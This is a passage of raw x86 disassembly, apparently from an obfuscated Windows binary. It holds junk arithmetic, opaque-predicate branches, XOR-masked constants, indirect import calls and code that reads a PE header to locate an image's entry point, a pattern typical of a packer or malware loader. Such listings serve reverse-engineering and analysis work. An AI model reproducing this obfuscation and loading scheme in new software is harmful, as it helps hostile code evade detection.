  41ec22:	mov    DWORD PTR [esp+0x48],0x53b7
  41ec2a:	mov    DWORD PTR [esp+0x4c],0x3d65
  41ec32:	cmp    DWORD PTR ds:0x422922,0x0
  41ec39:	mov    ebx,DWORD PTR ds:0x4228ce
  41ec3f:	mov    esi,0x4014
  41ec44:	jmp    0x41ecb9
  41ec49:	mov    DWORD PTR ds:0x42291a,ecx
  41ec4f:	jle    0x41ec9c
  41ec55:	push   0x1943
  41ec5a:	push   DWORD PTR [ebp-0xc]
  41ec5d:	push   DWORD PTR [ebp-0x14]
  41ec60:	push   0x5e2e
  41ec65:	push   0x7771
  41ec6a:	push   0x1795
  41ec6f:	push   DWORD PTR [ebp-0x24]
  41ec72:	push   0x7fcf
  41ec77:	push   DWORD PTR [ebp-0x10]
  41ec7a:	call   DWORD PTR ds:0x42a2c4
  41ec80:	and    DWORD PTR ds:0x4228f6,ebx
  41ec86:	xor    ebx,esi
  41ec88:	xor    ebx,ebx
  41ec8a:	xor    ebx,DWORD PTR ds:0x42295a
  41ec90:	or     ebx,DWORD PTR ds:0x4228d2
  41ec96:	mov    DWORD PTR ds:0x42295a,ebx
  41ec9c:	xor    esi,0x902
  41eca2:	dec    DWORD PTR ds:0x4228ca
  41eca8:	mov    ebx,DWORD PTR ds:0x4229fa
  41ecae:	mov    esi,DWORD PTR ds:0x422a42
  41ecb4:	sub    ebx,esi
  41ecb6:	add    ebx,DWORD PTR [ebx+esi*1]
  41ecb9:	mov    DWORD PTR [esp+0x48],0x3123
  41ecc1:	adc    ebx,esi
  41ecc3:	mov    DWORD PTR [esp+0x4c],0x4c23
  41eccb:	mov    DWORD PTR ds:0x4228b6,0x79fc
  41ecd5:	mov    ebx,0xba699573
  41ecda:	xor    DWORD PTR ds:0x4229be,edi
  41ece0:	mov    DWORD PTR [esp+0x20],ebx
  41ece4:	xor    DWORD PTR ds:0x42295a,0x1cf0
  41ecee:	mov    esi,0x9c0a89d8
  41ecf3:	sbb    DWORD PTR ds:0x422896,0x240d
  41ecfd:	mov    DWORD PTR [esp+0x24],esi
  41ed01:	add    DWORD PTR ds:0x4228d2,0x7237
  41ed0b:	mov    DWORD PTR [esp+0x70],0xba699577
  41ed13:	and    DWORD PTR ds:0x4228ba,0x422966
  41ed1d:	mov    DWORD PTR [esp+0x74],esi
  41ed21:	call   0x41a715
  41ed26:	lea    eax,[esp+0x58]
  41ed2a:	xor    edx,edx
  41ed2c:	or     edx,DWORD PTR ds:0x422892
  41ed32:	sbb    DWORD PTR ds:0x4228de,edx
  41ed38:	mov    DWORD PTR [esp+0x10],eax
  41ed3c:	mov    edx,DWORD PTR ds:0x422a32
  41ed42:	mov    ecx,DWORD PTR ds:0x422a56
  41ed48:	sub    edx,ecx
  41ed4a:	and    edx,DWORD PTR [edx+ecx*1]
  41ed4d:	lea    eax,[esp+0x68]
  41ed51:	cmp    DWORD PTR ds:0x42292a,0x0
  41ed58:	mov    DWORD PTR ds:0x422992,0x1c86
  41ed62:	mov    ecx,0x3791
  41ed67:	jmp    0x41edc9
  41ed6c:	mov    ecx,0x61d6
  41ed71:	mov    ecx,0xdc4
  41ed76:	jge    0x41edad
  41ed7c:	push   DWORD PTR [ebp-0x28]
  41ed7f:	call   DWORD PTR ds:0x42a2c8
  41ed85:	and    DWORD PTR ds:0x4228fe,0x4228ea
  41ed8f:	sbb    DWORD PTR ds:0x4228a6,edx
  41ed95:	mov    ecx,DWORD PTR ds:0x4228de
  41ed9b:	adc    ecx,DWORD PTR ds:0x4229aa
  41eda1:	mov    DWORD PTR ds:0x4228de,ecx
  41eda7:	inc    DWORD PTR ds:0x4228b2
  41edad:	adc    edx,0x372b
  41edb3:	and    DWORD PTR ds:0x4229be,edx
  41edb9:	adc    DWORD PTR ds:0x4229ae,0x769d
  41edc3:	xor    DWORD PTR ds:0x422952,edx
  41edc9:	mov    DWORD PTR [esp+0x18],eax
  41edcd:	mov    eax,ds:0x422268
  41edd2:	and    DWORD PTR ds:0x422962,ecx
  41edd8:	mov    eax,DWORD PTR [eax+0x1d8]
  41edde:	mov    eax,DWORD PTR [eax]
  41ede0:	sub    DWORD PTR ds:0x42293a,edx
  41ede6:	mov    ecx,eax
  41ede8:	cmp    DWORD PTR ds:0x422932,0x0
  41edef:	mov    DWORD PTR ds:0x4229c2,0xfd6
  41edf9:	mov    DWORD PTR ds:0x4229a6,edx
  41edff:	jmp    0x41ee45
  41ee04:	mov    DWORD PTR ds:0x422992,0x2118
  41ee0e:	jae    0x41ee2f
  41ee14:	push   0x4228a6
  41ee19:	push   0x66c0
  41ee1e:	call   DWORD PTR ds:0x42a084
  41ee24:	inc    edx
  41ee25:	sbb    DWORD PTR ds:0x4228d2,0x6891
  41ee2f:	xor    edx,0x2613
  41ee35:	sbb    edx,0x7527
  41ee3b:	mov    DWORD PTR ds:0x4229d2,0x388f
  41ee45:	xor    ecx,0xa3e69a9f
  41ee4b:	xor    eax,0x1
  41ee4e:	shl    eax,0x1e
  41ee51:	mov    DWORD PTR ds:0x4229b6,0x7a6d
  41ee5b:	shr    ecx,0x2
  41ee5e:	xor    edx,edx
  41ee60:	xor    edx,DWORD PTR ds:0x42289a
  41ee66:	or     DWORD PTR ds:0x4229d2,edx
  41ee6c:	or     ecx,eax
  41ee6e:	mov    eax,DWORD PTR [esp+0x18]
  41ee72:	mov    edx,DWORD PTR ds:0x4228ce
  41ee78:	sbb    DWORD PTR ds:0x4228a6,edx
  41ee7e:	mov    DWORD PTR [eax],ecx
  41ee80:	cmp    DWORD PTR ds:0x4229a6,0x0
  41ee87:	mov    DWORD PTR ds:0x4229b6,0x1832
  41ee91:	mov    DWORD PTR ds:0x42296a,0x16b9
  41ee9b:	jmp    0x41ef01
  41eea0:	mov    DWORD PTR ds:0x42290a,0x4517
  41eeaa:	mov    eax,ds:0x4229ca
  41eeaf:	jbe    0x41eedd
  41eeb5:	push   DWORD PTR [ebp-0x10]
  41eeb8:	push   DWORD PTR [ebp-0x28]
  41eebb:	push   0x51cb
  41eec0:	push   DWORD PTR [ebp-0x10]
  41eec3:	call   DWORD PTR ds:0x42a2cc
  41eec9:	sbb    ecx,0x7972
  41eecf:	mov    edx,DWORD PTR ds:0x422952
  41eed5:	xor    DWORD PTR ds:0x4229a2,edx
  41eedb:	add    edx,edx
  41eedd:	mov    edx,DWORD PTR ds:0x4229e2
  41eee3:	mov    edx,DWORD PTR [edx]
  41eee5:	adc    DWORD PTR ds:0x42296e,edx
  41eeeb:	sub    DWORD PTR ds:0x422992,0x5992
  41eef5:	sbb    DWORD PTR ds:0x42294e,edi
  41eefb:	neg    DWORD PTR ds:0x4228c2
  41ef01:	lea    edi,[ebx-0x10]
  41ef04:	add    DWORD PTR ds:0x4229a6,0x146e
  41ef0e:	mov    DWORD PTR [esp+0x80],edi
  41ef15:	or     DWORD PTR ds:0x42297e,ecx
  41ef1b:	mov    DWORD PTR [esp+0x84],esi
  41ef22:	mov    eax,DWORD PTR [esp+0x80]
  41ef29:	mov    ecx,DWORD PTR [esp+0x84]
  41ef30:	sub    edx,DWORD PTR ds:0x42289a
  41ef36:	shrd   eax,ecx,0x2
  41ef3a:	shr    ecx,0x2
  41ef3d:	mov    ecx,DWORD PTR [esp+0x80]
  41ef44:	adc    edx,DWORD PTR ds:0x4228d2
  41ef4a:	mov    edx,DWORD PTR [esp+0x84]
  41ef51:	adc    DWORD PTR ds:0x4228ea,0x422972
  41ef5b:	xor    eax,0x2e9a655c
  41ef60:	xor    edx,edx
  41ef62:	or     DWORD PTR ds:0x42297e,0x4228ea
  41ef6c:	or     edx,eax
  41ef6e:	mov    eax,ds:0x422268
  41ef73:	or     DWORD PTR ds:0x4229b2,0x2c69
  41ef7d:	push   edx
  41ef7e:	push   DWORD PTR [eax+0x19c]
  41ef84:	or     DWORD PTR ds:0x422922,0x4228d6
  41ef8e:	lea    eax,[esp+0x84]
  41ef95:	add    DWORD PTR ds:0x4228ca,0x6620
  41ef9f:	push   eax
  41efa0:	shl    ecx,0x1e
  41efa3:	call   0x41d2e9
  41efa8:	lea    eax,[ebp+0x10]
  41efab:	xor    DWORD PTR ds:0x422946,0x45ca
  41efb5:	push   eax
  41efb6:	and    DWORD PTR ds:0x42292a,0x42289a
  41efc0:	mov    DWORD PTR [esp+0x4c],edi
  41efc4:	sbb    DWORD PTR ds:0x4228ea,0x4647
  41efce:	mov    DWORD PTR [esp+0x50],esi
  41efd2:	lea    eax,[ebp+0xc]
  41efd5:	push   eax
  41efd6:	mov    DWORD PTR ds:0x4229a2,0x343e
  41efe0:	mov    DWORD PTR [esp+0x50],edi
  41efe4:	lea    eax,[ebp+0x8]
  41efe7:	sbb    DWORD PTR ds:0x4229a6,0x424a
  41eff1:	mov    DWORD PTR [esp+0x54],esi
  41eff5:	sub    DWORD PTR ds:0x4228de,0x42288e
  41efff:	mov    DWORD PTR [esp+0x50],edi
  41f003:	add    DWORD PTR ds:0x42298a,0x42297a
  41f00d:	mov    DWORD PTR [esp+0x54],esi
  41f011:	push   eax
  41f012:	not    DWORD PTR ds:0x422996
  41f018:	call   0x41c14a
  41f01d:	or     DWORD PTR ds:0x42299a,0x467c
  41f027:	push   0x4
  41f029:	adc    DWORD PTR ds:0x422896,0x42298a
  41f033:	push   0x4220ec
  41f038:	or     DWORD PTR ds:0x4229a2,0x42297a
  41f042:	push   DWORD PTR [esp+0x18]
  41f046:	adc    DWORD PTR ds:0x422902,0x4228b2
  41f050:	call   0x41d2e9
  41f055:	mov    eax,DWORD PTR [esp+0x10]
  41f059:	adc    DWORD PTR ds:0x42293e,edi
  41f05f:	mov    ecx,DWORD PTR [esp+0x10]
  41f063:	add    edx,DWORD PTR ds:0x422962
  41f069:	mov    eax,DWORD PTR [eax]
  41f06b:	cmp    DWORD PTR ds:0x422996,0x0
  41f072:	mov    DWORD PTR ds:0x422976,0x7903
  41f07c:	not    DWORD PTR ds:0x4228e2
  41f082:	jmp    0x41f0b6
  41f087:	mov    DWORD PTR ds:0x422942,edi
  41f08d:	jle    0x41f0aa
  41f093:	push   DWORD PTR [ebp-0x10]
  41f096:	call   DWORD PTR ds:0x42a088
  41f09c:	neg    edi
  41f09e:	sbb    edx,DWORD PTR ds:0x422936
  41f0a4:	not    DWORD PTR ds:0x42299a
  41f0aa:	not    edi
  41f0ac:	adc    DWORD PTR ds:0x42290e,0x107e
  41f0b6:	mov    ecx,DWORD PTR [ecx]
  41f0b8:	shr    eax,0x1e
  41f0bb:	shl    ecx,0x2
  41f0be:	or     eax,ecx
  41f0c0:	mov    ecx,DWORD PTR [esp+0x10]
  41f0c4:	xor    eax,0xa3e69a9d
  41f0c9:	mov    DWORD PTR [ecx],eax
  41f0cb:	lea    eax,[esp+0x54]
  41f0cf:	mov    DWORD PTR [esp+0x94],eax
  41f0d6:	lea    eax,[esp+0x94]
  41f0dd:	mov    DWORD PTR [esp+0x90],eax
  41f0e4:	mov    eax,DWORD PTR [esp+0x54]
  41f0e8:	sub    DWORD PTR [esp+0x54],eax
  41f0ec:	lea    eax,[ebp+0x4]
  41f0ef:	xor    DWORD PTR [esp+0x54],eax
  41f0f3:	mov    DWORD PTR [esp+0x10],0x5b3d
  41f0fb:	mov    DWORD PTR [esp+0x14],0x4445
  41f103:	mov    DWORD PTR [esp+0x38],0xa52
  41f10b:	mov    DWORD PTR [esp+0x3c],0x1c69
  41f113:	mov    eax,DWORD PTR [esp+0x38]
  41f117:	mov    ecx,DWORD PTR [esp+0x3c]
  41f11b:	mov    edx,DWORD PTR [esp+0x10]
  41f11f:	mov    edi,DWORD PTR [esp+0x14]
  41f123:	add    eax,0xffffd1a5
  41f128:	adc    ecx,0xffffedf0
  41f12e:	xor    eax,edx
  41f130:	xor    ecx,edi
  41f132:	and    eax,0x325d
  41f137:	mov    DWORD PTR [esp+0x40],eax
  41f13b:	and    ecx,0x3544
  41f141:	mov    DWORD PTR [esp+0x44],ecx
  41f145:	mov    DWORD PTR [esp+0x18],0x1704
  41f14d:	mov    DWORD PTR [esp+0x1c],0x4a75
  41f155:	mov    DWORD PTR [esp+0x10],0x985
  41f15d:	mov    DWORD PTR [esp+0x14],0x341
  41f165:	mov    DWORD PTR [esp+0x38],0x5aa9
  41f16d:	mov    DWORD PTR [esp+0x3c],0x221a
  41f175:	mov    eax,DWORD PTR [esp+0x38]
  41f179:	mov    ecx,DWORD PTR [esp+0x3c]
  41f17d:	mov    edx,DWORD PTR [esp+0x10]
  41f181:	mov    edi,DWORD PTR [esp+0x14]
  41f185:	push   edi
  41f186:	push   edx
  41f187:	or     ecx,0xc32
  41f18d:	or     eax,0x502a
  41f192:	push   ecx
  41f193:	push   eax
  41f194:	call   0x41df90
  41f199:	mov    ecx,DWORD PTR [esp+0x18]
  41f19d:	mov    edi,DWORD PTR [esp+0x1c]
  41f1a1:	sub    eax,ecx
  41f1a3:	mov    ecx,DWORD PTR [esp+0x40]
  41f1a7:	sbb    edx,edi
  41f1a9:	mov    edi,DWORD PTR [esp+0x44]
  41f1ad:	cmp    ecx,eax
  41f1af:	jne    0x41f1bd
  41f1b5:	cmp    edi,edx
  41f1b7:	je     0x41f67c
  41f1bd:	mov    DWORD PTR [esp+0x10],0x71ba
  41f1c5:	mov    DWORD PTR [esp+0x14],0x5f78
  41f1cd:	mov    DWORD PTR [esp+0x38],0x7b9c
  41f1d5:	mov    DWORD PTR [esp+0x3c],0x5622
  41f1dd:	mov    eax,DWORD PTR [esp+0x38]
  41f1e1:	mov    ecx,DWORD PTR [esp+0x3c]
  41f1e5:	mov    edx,DWORD PTR [esp+0x10]
  41f1e9:	mov    edi,DWORD PTR [esp+0x14]
  41f1ed:	add    eax,0x3646
  41f1f2:	adc    ecx,0x7ace
  41f1f8:	xor    eax,0x3e2e
  41f1fd:	xor    ecx,0x4b71
  41f203:	and    eax,edx
  41f205:	mov    DWORD PTR [esp+0x48],eax
  41f209:	and    ecx,edi
  41f20b:	mov    DWORD PTR [esp+0x4c],ecx
  41f20f:	mov    DWORD PTR [esp+0x40],0x18d6
  41f217:	mov    DWORD PTR [esp+0x44],0x2bb4
  41f21f:	mov    DWORD PTR [esp+0x18],0x14
  41f227:	mov    DWORD PTR [esp+0x1c],0x0
  41f22f:	mov    DWORD PTR [esp+0x10],0x1
  41f237:	mov    DWORD PTR [esp+0x14],0x0
  41f23f:	mov    DWORD PTR [esp+0x38],0xa87
  41f247:	mov    DWORD PTR [esp+0x3c],0x7fd9
  41f24f:	mov    eax,DWORD PTR [esp+0x38]
  41f253:	mov    ecx,DWORD PTR [esp+0x3c]
  41f257:	push   0x2
  41f259:	push   0x7f349462
  41f25e:	xor    ecx,0x3601
  41f264:	xor    eax,0x5491
  41f269:	push   ecx
  41f26a:	push   eax
  41f26b:	call   0x421ad5
  41f270:	mov    ecx,DWORD PTR [esp+0x10]
  41f274:	mov    edi,DWORD PTR [esp+0x14]
  41f278:	push   edi
  41f279:	push   ecx
  41f27a:	push   edx
  41f27b:	push   eax
  41f27c:	call   0x421ad5
  41f281:	mov    ecx,DWORD PTR [esp+0x18]
  41f285:	mov    edi,DWORD PTR [esp+0x1c]
  41f289:	push   edi
  41f28a:	push   ecx
  41f28b:	push   edx
  41f28c:	push   eax
  41f28d:	call   0x421ad5
  41f292:	mov    ecx,DWORD PTR [esp+0x40]
  41f296:	mov    edi,DWORD PTR [esp+0x44]
  41f29a:	add    eax,ecx
  41f29c:	mov    ecx,DWORD PTR [esp+0x48]
  41f2a0:	adc    edx,edi
  41f2a2:	mov    edi,DWORD PTR [esp+0x4c]
  41f2a6:	cmp    ecx,eax
  41f2a8:	jne    0x41f2b6
  41f2ae:	cmp    edi,edx
  41f2b0:	je     0x41f67c
  41f2b6:	mov    eax,DWORD PTR [esp+0x54]
  41f2ba:	mov    edx,DWORD PTR [esp+0x20]
  41f2be:	mov    edi,DWORD PTR [esp+0x24]
  41f2c2:	xor    ecx,ecx
  41f2c4:	shld   ecx,eax,0x2
  41f2c8:	shl    eax,0x2
  41f2cb:	xor    eax,ebx
  41f2cd:	xor    ecx,esi
  41f2cf:	cmp    eax,edx
  41f2d1:	jne    0x41f2df
  41f2d7:	cmp    ecx,edi
  41f2d9:	je     0x41f67c
  41f2df:	mov    eax,DWORD PTR [esp+0x58]
  41f2e3:	cmp    eax,0xa3e69a99
  41f2e8:	je     0x41f33f
  41f2ee:	mov    eax,DWORD PTR [esp+0x20]
  41f2f2:	mov    ecx,DWORD PTR [esp+0x24]
  41f2f6:	mov    edx,DWORD PTR [esp+0x20]
  41f2fa:	mov    edi,DWORD PTR [esp+0x24]
  41f2fe:	xor    edi,esi
  41f300:	xor    edx,ebx
  41f302:	shrd   edx,edi,0x2
  41f306:	mov    ecx,eax
  41f308:	shr    edi,0x2
  41f30b:	xor    eax,eax
  41f30d:	mov    DWORD PTR [esp+0x10],edi
  41f311:	mov    edi,edx
  41f313:	or     edi,eax
  41f315:	mov    eax,DWORD PTR [esp+0x10]
  41f319:	shl    ecx,0x1e
  41f31c:	xor    ecx,0xc0000000
  41f322:	or     eax,ecx
  41f324:	mov    DWORD PTR [esp+0x4c],eax
  41f328:	mov    eax,DWORD PTR [esp+0x68]
  41f32c:	cdq    
  41f32d:	cmp    edi,eax
  41f32f:	jne    0x41f67c
  41f335:	cmp    DWORD PTR [esp+0x4c],edx
  41f339:	jne    0x41f67c
  41f33f:	mov    DWORD PTR [esp+0x64],0x422304
  41f347:	mov    DWORD PTR [esp+0x6c],0x4222fc
  41f34f:	mov    eax,DWORD PTR [esp+0x7c]
  41f353:	mov    eax,DWORD PTR [esp+0x7c]
  41f357:	mov    edx,DWORD PTR [esp+0x20]
  41f35b:	mov    edi,DWORD PTR [esp+0x24]
  41f35f:	xor    ecx,ecx
  41f361:	shld   ecx,eax,0x2
  41f365:	shl    eax,0x2
  41f368:	xor    eax,ebx
  41f36a:	xor    ecx,esi
  41f36c:	cmp    edx,eax
  41f36e:	jne    0x41f58c
  41f374:	cmp    edi,ecx
  41f376:	jne    0x41f58c
  41f37c:	mov    DWORD PTR [esp+0x10],0x42228c
  41f384:	mov    ecx,DWORD PTR [esp+0x20]
  41f388:	mov    eax,DWORD PTR [esp+0x24]
  41f38c:	shrd   ecx,eax,0x2
  41f390:	shr    eax,0x2
  41f393:	mov    eax,DWORD PTR [esp+0x20]
  41f397:	mov    edx,DWORD PTR [esp+0x24]
  41f39b:	shl    eax,0x1e
  41f39e:	mov    edi,0x2e9a655c
  41f3a3:	xor    ecx,edi
  41f3a5:	xor    eax,eax
  41f3a7:	or     eax,ecx
  41f3a9:	mov    ecx,DWORD PTR [esp+0x10]
  41f3ad:	mov    ecx,DWORD PTR [ecx+0xc]
  41f3b0:	cmp    eax,DWORD PTR [ecx]
  41f3b2:	jne    0x41f52b
  41f3b8:	mov    eax,0x65c7
  41f3bd:	mov    WORD PTR [esp+0x40],ax
  41f3c2:	mov    eax,0x6062
  41f3c7:	mov    WORD PTR [esp+0x18],ax
  41f3cc:	mov    eax,0x125d
  41f3d1:	mov    WORD PTR [esp+0x10],ax
  41f3d6:	movzx  eax,WORD PTR [esp+0x10]
  41f3db:	mov    ecx,0x2d0f
  41f3e0:	and    ax,cx
  41f3e3:	mov    cx,WORD PTR [esp+0x18]
  41f3e8:	or     ax,cx
  41f3eb:	mov    cx,WORD PTR [esp+0x40]
  41f3f0:	add    ax,cx
  41f3f3:	or     eax,0x3b22
  41f3f8:	mov    WORD PTR [esp+0x30],ax
  41f3fd:	mov    eax,0x57d4
  41f402:	mov    WORD PTR [esp+0x40],ax
  41f407:	mov    eax,0x3b21
  41f40c:	mov    WORD PTR [esp+0x2c],ax
  41f411:	mov    eax,0x52fd
  41f416:	mov    WORD PTR [esp+0x18],ax
  41f41b:	mov    eax,0x2ce0
  41f420:	mov    WORD PTR [esp+0x10],ax
  41f425:	mov    ax,WORD PTR [esp+0x10]
  41f42a:	mov    cx,WORD PTR [esp+0x18]
  41f42f:	or     ax,cx
  41f432:	mov    ecx,0x21a4
  41f437:	or     ax,cx
  41f43a:	mov    cx,WORD PTR [esp+0x40]
  41f43f:	sub    ax,cx
  41f442:	mov    cx,WORD PTR [esp+0x2c]
  41f447:	sub    ax,cx
  41f44a:	mov    cx,WORD PTR [esp+0x30]
  41f44f:	cmp    cx,ax
  41f452:	jbe    0x41f52b
  41f458:	mov    eax,0x5008
  41f45d:	mov    WORD PTR [esp+0x18],ax
  41f462:	mov    eax,0x60ce
  41f467:	mov    WORD PTR [esp+0x10],ax
  41f46c:	movzx  eax,WORD PTR [esp+0x10]
  41f471:	mov    ecx,0x2095
  41f476:	or     ax,cx
  41f479:	mov    cx,WORD PTR [esp+0x18]
  41f47e:	sub    ax,cx
  41f481:	mov    ecx,0x10de
  41f486:	or     eax,0x742f
  41f48b:	imul   eax,eax,0x30b2
  41f491:	mov    WORD PTR [esp+0x30],ax
  41f496:	mov    eax,0x6143
  41f49b:	mov    WORD PTR [esp+0x2c],ax
  41f4a0:	mov    eax,0x679f
  41f4a5:	mov    WORD PTR [esp+0x40],ax
  41f4aa:	mov    eax,0x1210
  41f4af:	mov    WORD PTR [esp+0x18],ax
  41f4b4:	mov    eax,0x3308
  41f4b9:	mov    WORD PTR [esp+0x10],ax
  41f4be:	mov    ax,WORD PTR [esp+0x10]
  41f4c3:	sub    ax,cx
  41f4c6:	mov    cx,WORD PTR [esp+0x18]
  41f4cb:	xor    ax,cx
  41f4ce:	mov    cx,WORD PTR [esp+0x40]
  41f4d3:	imul   ax,cx
  41f4d7:	mov    cx,WORD PTR [esp+0x2c]
  41f4dc:	and    ax,cx
  41f4df:	mov    ecx,0x694c
  41f4e4:	and    ax,cx
  41f4e7:	mov    cx,WORD PTR [esp+0x30]
  41f4ec:	cmp    cx,ax
  41f4ef:	ja     0x41f52b
  41f4f5:	mov    eax,DWORD PTR [esp+0x20]
  41f4f9:	mov    ecx,DWORD PTR [esp+0x24]
  41f4fd:	shrd   eax,ecx,0x2
  41f501:	shr    ecx,0x2
  41f504:	mov    ecx,DWORD PTR [esp+0x20]
  41f508:	mov    edx,DWORD PTR [esp+0x24]
  41f50c:	xor    eax,edi
  41f50e:	xor    edx,edx
  41f510:	or     edx,eax
  41f512:	push   edx
  41f513:	push   esi
  41f514:	push   0xba699563
  41f519:	lea    eax,[esp+0x7c]
  41f51d:	push   eax
  41f51e:	lea    eax,[esp+0x30]
  41f522:	push   eax
  41f523:	shl    ecx,0x1e
  41f526:	call   0x41d271
  41f52b:	push   DWORD PTR [esp+0x74]
  41f52f:	push   DWORD PTR [esp+0x74]
  41f533:	push   DWORD PTR [esp+0x2c]
  41f537:	push   DWORD PTR [esp+0x2c]
  41f53b:	call   0x41d445
  41f540:	mov    ecx,DWORD PTR [esp+0x20]
  41f544:	mov    eax,DWORD PTR [esp+0x24]
  41f548:	shrd   ecx,eax,0x2
  41f54c:	shr    eax,0x2
  41f54f:	mov    eax,DWORD PTR [esp+0x20]
  41f553:	mov    edx,DWORD PTR [esp+0x24]
  41f557:	shl    eax,0x1e
  41f55a:	xor    eax,eax
  41f55c:	xor    ecx,edi
  41f55e:	or     eax,ecx
  41f560:	mov    ecx,DWORD PTR [esp+0x64]
  41f564:	mov    DWORD PTR [ecx],eax
  41f566:	mov    ecx,DWORD PTR [esp+0x20]
  41f56a:	mov    eax,DWORD PTR [esp+0x24]
  41f56e:	shrd   ecx,eax,0x2
  41f572:	shr    eax,0x2
  41f575:	mov    eax,DWORD PTR [esp+0x20]
  41f579:	mov    edx,DWORD PTR [esp+0x24]
  41f57d:	shl    eax,0x1e
  41f580:	xor    ecx,edi
  41f582:	xor    eax,eax
  41f584:	or     eax,ecx
  41f586:	mov    ecx,DWORD PTR [esp+0x6c]
  41f58a:	mov    DWORD PTR [ecx],eax
  41f58c:	mov    eax,DWORD PTR [esp+0x6c]
  41f590:	mov    ecx,DWORD PTR [esp+0x6c]
  41f594:	mov    eax,DWORD PTR [eax]
  41f596:	cmp    eax,DWORD PTR [ecx]
  41f598:	jne    0x41f660
  41f59e:	mov    eax,DWORD PTR [esp+0x64]
  41f5a2:	mov    ecx,DWORD PTR [esp+0x64]
  41f5a6:	mov    eax,DWORD PTR [eax]
  41f5a8:	cmp    eax,DWORD PTR [ecx]
  41f5aa:	jne    0x41f660
  41f5b0:	mov    BYTE PTR [esp+0x40],0x20
  41f5b5:	mov    BYTE PTR [esp+0x2c],0x3
  41f5ba:	mov    BYTE PTR [esp+0x30],0x6d
  41f5bf:	mov    BYTE PTR [esp+0x37],0x90
  41f5c4:	mov    al,BYTE PTR [esp+0x37]
  41f5c8:	mov    cl,BYTE PTR [esp+0x30]
  41f5cc:	or     al,0xdc
  41f5ce:	sub    al,cl
  41f5d0:	mov    cl,BYTE PTR [esp+0x2c]
  41f5d4:	sub    al,0x56
  41f5d6:	movzx  eax,al
  41f5d9:	movzx  ecx,cl
  41f5dc:	cdq    
  41f5dd:	idiv   ecx
  41f5df:	movzx  ecx,BYTE PTR [esp+0x40]
  41f5e4:	or     eax,ecx
  41f5e6:	mov    BYTE PTR [esp+0x10],al
  41f5ea:	mov    BYTE PTR [esp+0x18],0x1
  41f5ef:	mov    BYTE PTR [esp+0x37],0xcf
  41f5f4:	mov    BYTE PTR [esp+0x30],0x6
  41f5f9:	mov    BYTE PTR [esp+0x2c],0x25
  41f5fe:	mov    BYTE PTR [esp+0x40],0xf8
  41f603:	mov    al,BYTE PTR [esp+0x40]
  41f607:	mov    cl,BYTE PTR [esp+0x2c]
  41f60b:	or     al,0xc4
  41f60d:	and    al,cl
  41f60f:	mov    cl,BYTE PTR [esp+0x30]
  41f613:	imul   cl
  41f615:	mov    cl,BYTE PTR [esp+0x37]
  41f619:	movzx  ecx,cl
  41f61c:	movzx  eax,al
  41f61f:	and    eax,ecx
  41f621:	mov    cl,BYTE PTR [esp+0x18]
  41f625:	movzx  ecx,cl
  41f628:	cdq    
  41f629:	idiv   ecx
  41f62b:	mov    cl,BYTE PTR [esp+0x10]
  41f62f:	cmp    cl,al
  41f631:	je     0x41f67c
  41f637:	lea    eax,[esp+0x90]
  41f63e:	push   eax
  41f63f:	lea    edi,[esp+0x90]
  41f646:	call   0x41c4a3
  41f64b:	cmp    eax,ebx
  41f64d:	jne    0x41f67c
  41f653:	cmp    edx,esi
  41f655:	jne    0x41f67c
  41f65b:	jmp    0x41e1e2
  41f660:	mov    eax,DWORD PTR [esp+0x70]
  41f664:	mov    ecx,DWORD PTR [esp+0x74]
  41f668:	mov    edx,DWORD PTR [esp+0x20]
  41f66c:	mov    edi,DWORD PTR [esp+0x24]
  41f670:	add    eax,edx
  41f672:	adc    ecx,edi
  41f674:	mov    DWORD PTR [esp+0x20],eax
  41f678:	mov    DWORD PTR [esp+0x24],ecx
  41f67c:	push   0x4
  41f67e:	push   0x422268
  41f683:	lea    eax,[esp+0x64]
  41f687:	push   eax
  41f688:	call   0x41d2e9
  41f68d:	mov    eax,DWORD PTR [esp+0x5c]
  41f691:	push   0x4
  41f693:	push   DWORD PTR [eax+0x1a4]
  41f699:	lea    eax,[esp+0x68]
  41f69d:	push   eax
  41f69e:	call   0x41d2e9
  41f6a3:	mov    eax,DWORD PTR [esp+0x5c]
  41f6a7:	mov    eax,DWORD PTR [eax+0x1a4]
  41f6ad:	mov    eax,DWORD PTR [eax]
  41f6af:	mov    ecx,DWORD PTR [esp+0x5c]
  41f6b3:	mov    eax,DWORD PTR [eax+0x3c]
  41f6b6:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41f6bc:	mov    ecx,DWORD PTR [ecx]
  41f6be:	lea    eax,[ecx+eax*1+0x28]
  41f6c2:	mov    eax,DWORD PTR [eax]
  41f6c4:	add    DWORD PTR [esp+0x60],eax
  41f6c8:	mov    DWORD PTR [esp+0x18],0x127
  41f6d0:	mov    DWORD PTR [esp+0x10],0x421a
  41f6d8:	mov    eax,DWORD PTR [esp+0x10]
  41f6dc:	and    eax,0xffffc244
  41f6e1:	add    eax,DWORD PTR [esp+0x18]
  41f6e5:	and    eax,0xfffffe5a
  41f6ea:	sub    eax,0x2ae1
  41f6ef:	and    eax,0x6f90
  41f6f4:	mov    DWORD PTR [esp+0x18],eax
  41f6f8:	mov    DWORD PTR [esp+0x10],0x1515
  41f700:	mov    eax,DWORD PTR [esp+0x10]
  41f704:	mov    ecx,DWORD PTR [esp+0x18]
  41f708:	or     eax,0x7113
  41f70d:	add    eax,0x3d6a
  41f712:	cmp    ecx,eax
  41f714:	je     0x41f804
  41f71a:	mov    eax,DWORD PTR [esp+0x54]
  41f71e:	mov    edx,DWORD PTR [esp+0x20]
  41f722:	mov    edi,DWORD PTR [esp+0x24]
  41f726:	xor    ecx,ecx
  41f728:	shld   ecx,eax,0x2
  41f72c:	shl    eax,0x2
  41f72f:	xor    eax,ebx
  41f731:	xor    ecx,esi
  41f733:	cmp    eax,edx
  41f735:	jne    0x41f743
  41f73b:	cmp    ecx,edi
  41f73d:	je     0x41f7bd
  41f743:	mov    eax,DWORD PTR [esp+0x58]
  41f747:	mov    eax,DWORD PTR [esp+0x58]
  41f74b:	mov    eax,DWORD PTR [esp+0x58]
  41f74f:	mov    ecx,DWORD PTR [esp+0x58]
  41f753:	xor    eax,0xa3e69a9f
  41f758:	xor    ecx,0x1
  41f75b:	shr    eax,0x2
  41f75e:	shl    ecx,0x1e
  41f761:	or     eax,ecx
  41f763:	xor    ecx,ecx
  41f765:	shld   ecx,eax,0x2
  41f769:	shl    eax,0x2
  41f76c:	xor    eax,ebx
  41f76e:	xor    ecx,esi
  41f770:	cmp    eax,0xba699577
  41f775:	jne    0x41f783
  41f77b:	cmp    ecx,esi
  41f77d:	je     0x41f804
  41f783:	mov    eax,DWORD PTR [esp+0x68]
  41f787:	cdq    
